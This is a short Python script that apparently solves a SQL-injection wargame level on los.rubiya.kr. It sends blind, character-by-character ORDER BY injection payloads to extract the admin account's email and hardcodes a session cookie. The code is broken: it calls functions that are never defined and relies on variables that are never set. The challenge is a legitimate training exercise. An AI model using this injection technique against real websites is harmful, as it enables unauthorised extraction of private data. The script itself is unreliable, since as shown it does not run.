from requests import Session, request

URL = "https://los.rubiya.kr/chall/green_dragon_74d944f888fd3f9cf76e4e230e78c45b.php"
session = {"PHPSESSID": "c8o4nup8pn2fn76vsh9mlrmrni"}
"""

"""

def getFlag():
    global EmailLength
    global FLAG

    for i in range(1, EmailLength + 1):
        for j in range(33, 127):
            # print(i, j)
            payload = f"?order=if((id=%27admin%27 and ascii(substr(email,{i},1))={j}),score,9999)%23"
            res = request(method='GET', url=URL + payload, cookies=session)
            print(f"[*] in progress {(i,j)}/{payload}")

            if "</td><td>200</td></tr><tr><td>rubiya</td>" in res.text:
                FLAG = FLAG + chr(j)
                print(f"Find !! email[{str(i)}] is :: {chr(j)} ||| {FLAG}")
                break

        if FLAG == "":
            print("Not Correct payload...")
            break


    print(f"email :: {FLAG}")


if __name__ == '__main__':
    lengthEmail()
    getEmail()
    # email :: admin_secure_email@emai1.com
